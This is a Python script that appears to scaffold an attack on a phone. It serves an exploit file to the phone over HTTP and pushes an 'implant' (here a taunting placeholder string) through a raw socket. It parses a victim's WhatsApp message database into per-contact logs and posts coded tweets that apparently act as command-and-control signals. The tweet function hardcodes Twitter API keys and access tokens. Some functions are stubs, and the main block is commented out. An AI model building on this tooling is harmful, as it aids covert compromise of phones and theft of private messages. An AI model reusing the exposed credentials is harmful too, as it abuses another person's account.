import http.server, socket, sqlite3, tweepy

# uses port 12345, ensure later processes use a different port
# TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
def listen_for_phone_and_send_exploit_file(ip_address):
    server_address = (ip_address, 12345)
    print("Localhost waiting on port 12345 for client to connect")
    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    s.handle_request()

def send_implant(ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969               
    s.bind((ip_address, port))
    s.listen(1)        
    print("Listening on port 6969 of " + ip_address)        
    count = 0 
    while count < 1:
        conn, addr = s.accept()
        print('Got connection from: ', addr)
        payload = 'HaHahAHa gEt pWnEd LOLOLOL'
        conn.send(payload.encode())
        print("Payload sent to target")
        count += 1
        conn.close() 
        print("Connection closed")

def fetch_tweets():
    pass

def undo_steganography():
    pass

def decode_whatsapp_messages():
    print("Starting to decode WhatsApp messages from the SQLite3 Database")
    path_to_msg_database = '../whatsapp-databases/msgstore.db'
    c = connect_to_db(path_to_msg_database)
    c.execute("SELECT * FROM legacy_available_messages_view;")
    messages = c.fetchall()
    
    # message tuple design key = contact values = (message, from_me, timestamp)
    message_dict = {}
    for message in messages:
        if message[1] not in message_dict:
            if message[6] is not None:
                message_dict[message[1]] = [(message[6], message[2], message[7])]
        else:
            message_dict[message[1]].append((message[6], message[2], message[7]))

    for key in message_dict.keys():
        print("Key : {} , Value : {}".format(key,message_dict[key]))
    

def connect_to_db(filepath):
    conn = sqlite3.connect(filepath)
    c = conn.cursor()
    return c

def tweet(text_to_tweet):
    consumer_key = "Z5kqu3hywa02aW2BYNGeWkkXA"
    consumer_secret = "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4"
    access_token ="1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4"
    access_token_secret ="2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7"
    
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret) 
    auth.set_access_token(access_token, access_token_secret) 
    api = tweepy.API(auth) 
    
    api.update_status(status = text_to_tweet)

def burn_the_toast():
    tweet("Burn the toast")
    print("The toast has been burned")
    # TODO shutoff server?

def butter_the_toast():
    tweet("Butter the toast")
    print("The toast has been buttered")

if __name__ == "__main__":
    # host = 'localhost'
    # listen_for_phone_and_send_exploit_file(host)
    # send_implant(host)
    # butter_the_toast()
    # decode_whatsapp_messages()
    # burn_the_toast()
    pass
